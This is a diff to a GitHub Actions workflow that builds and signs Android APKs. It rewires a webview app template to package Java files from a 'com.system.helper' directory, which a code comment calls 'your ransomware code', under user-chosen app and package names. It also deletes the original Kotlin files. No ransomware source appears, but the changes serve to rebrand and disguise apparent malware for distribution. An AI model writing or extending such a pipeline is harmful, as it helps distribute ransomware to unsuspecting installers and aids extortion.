@@ -46,22 +46,36 @@ jobs:
 
       - name: Inject parameters
         run: |
-          sed -i 's|{{APP_URL}}|${{ github.event.inputs.app_url }}|g' app/src/main/java/com/webviewapp/MainActivity.kt
           PKG="${{ github.event.inputs.package_name }}"
-          sed -i "s|{{APP_PACKAGE}}|${PKG}|g" app/src/main/AndroidManifest.xml app/build.gradle
           NAME="${{ github.event.inputs.app_name }}"
-          sed -i "s|{{APP_NAME}}|${NAME}|g" app/src/main/res/values/strings.xml app/src/main/AndroidManifest.xml
           VER="${{ github.event.inputs.version_name }}"
           VC=$(echo "$VER" | awk -F. '{ printf "%d%02d%02d", $1, $2, $3 }')
+          
+          # Update AndroidManifest.xml
+          sed -i "s|{{APP_PACKAGE}}|${PKG}|g" app/src/main/AndroidManifest.xml
+          sed -i "s|{{APP_NAME}}|${NAME}|g" app/src/main/AndroidManifest.xml
+          
+          # Update build.gradle
           sed -i "s|{{VERSION_NAME}}|${VER}|g" app/build.gradle
           sed -i "s|{{VERSION_CODE}}|${VC}|g" app/build.gradle
-          PKG_PATH=$(echo $PKG | sed 's/\.//g; s/./&\//g' | sed 's/\(.*\)\//\1/')
+          
+          # Update package in Java files (your ransomware code)
           PKG_PATH=$(echo $PKG | tr '.' '/')
           echo "PKG_PATH is: $PKG_PATH"
           mkdir -p app/src/main/java/$PKG_PATH
-          sed -i "s|package com.webviewapp|package $PKG|g" app/src/main/java/com/webviewapp/*.kt
-          mv app/src/main/java/com/webviewapp/*.kt app/src/main/java/$PKG_PATH/
-          sed -i "s|com.webviewapp|$PKG|g" app/src/main/res/layout/activity_main.xml
+          
+          # Handle your Java files - move them to the new package
+          if [ -d "app/src/main/java/com/system/helper" ]; then
+            sed -i "s|package com.system.helper|package $PKG|g" app/src/main/java/com/system/helper/*.java 2>/dev/null || true
+            mv app/src/main/java/com/system/helper/*.java app/src/main/java/$PKG_PATH/ 2>/dev/null || true
+          fi
+          
+          # Update layout files
+          sed -i "s|com.system.helper|$PKG|g" app/src/main/res/layout/activity_main.xml 2>/dev/null || true
+          sed -i "s|com.webviewapp|$PKG|g" app/src/main/res/layout/activity_main.xml 2>/dev/null || true
+          
+          # Clean up any Kotlin files that might cause issues
+          find app/src -name "*.kt" -type f -delete 2>/dev/null || true
 
       - name: Ensure fallback launcher resources
         run: |
@@ -82,7 +96,7 @@ jobs:
           ICON_URL: ${{ github.event.inputs.icon_url }}
         run: |
           pip install Pillow -q
-          python3 Scripts/process_icon.py
+          python3 Scripts/process_icon.py || echo "Icon processing skipped"
 
       - name: Build APK (arm64 + armeabi-v7a)
         run: |
@@ -129,6 +143,7 @@ jobs:
           ls -la /tmp/signed/
           echo "SIGNED_DIR=/tmp/signed" >> $GITHUB_ENV
           echo "APK_NAME=${SAFE}_${VER}" >> $GITHUB_ENV
+
       - name: Upload arm64 APK
         uses: actions/upload-artifact@v4
         with:
